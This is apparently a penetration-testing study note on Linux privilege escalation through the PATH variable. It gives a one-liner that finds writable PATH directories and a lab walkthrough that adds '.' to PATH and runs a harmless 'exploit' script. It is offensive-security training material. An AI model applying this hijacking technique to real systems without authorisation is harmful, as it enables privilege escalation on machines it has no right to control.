---
id: Environment
aliases: []
tags:
  - Linux/Privesc/Environment
links: "[[Linux/Linux]]"
---

# PATH

The `$PATH` [environment variable](https://en.wikipedia.org/wiki/Environment_variable)
specifies the set of directories where an executable can be located

<!-- Tip {{{-->
> [!tip]
>
> Any directory inside the `PATH` variable with
> [[Linux/General/File System/Permissions|write permissions]]
> may allow to hijack its libraries or binaries
<!-- }}} -->

```sh
echo $PATH
```

```sh
env | grep PATH
```

___

<!-- Writeable PATH {{{-->
## Writeable PATH

Automated script

```sh
echo $PATH \
  | tr ':' '\n' \
  | while read dir; \
        do [ -d "$dir" ] && [ -w "$dir" ] && echo "[+] :: Write Permission Set :: $dir"; \
    done
```

___
<!-- }}} -->

<!-- PATH Abuse {{{-->
## PATH Abuse

1. Add the current directory (`.`) to the `PATH`

```sh
PATH=.:$PATH
```

```sh
export PATH
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> htb_student@NIX02:~$ PATH=.:${PATH}
> ```
>
> ```sh
> htb_student@NIX02:~$ export PATH
> ```
>
> ```sh
> htb_student@NIX02:~$ echo $PATH
> ```
>
> ```sh
> .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
> ```
>
<!-- }}} -->


2. Create a malicious executable in the current directory

```sh
touch exploit
```

```sh
echo 'echo "PATH ABUSE!!"' > exploit
```

```sh
chmod +x exploit
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> htb_student@NIX02:~$ touch exploit
> ```
>
> ```sh
> htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > exploit
> ```
>
> ```sh
> htb_student@NIX02:~$ chmod +x exploit
> ```
>
<!-- }}} -->

3. Execute the malicious script

```sh
exploit
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> htb_student@NIX02:~$ exploit
> ```
>
> ```sh
> PATH ABUSE!!
> ```
>
<!-- }}} -->

___
<!-- }}} -->
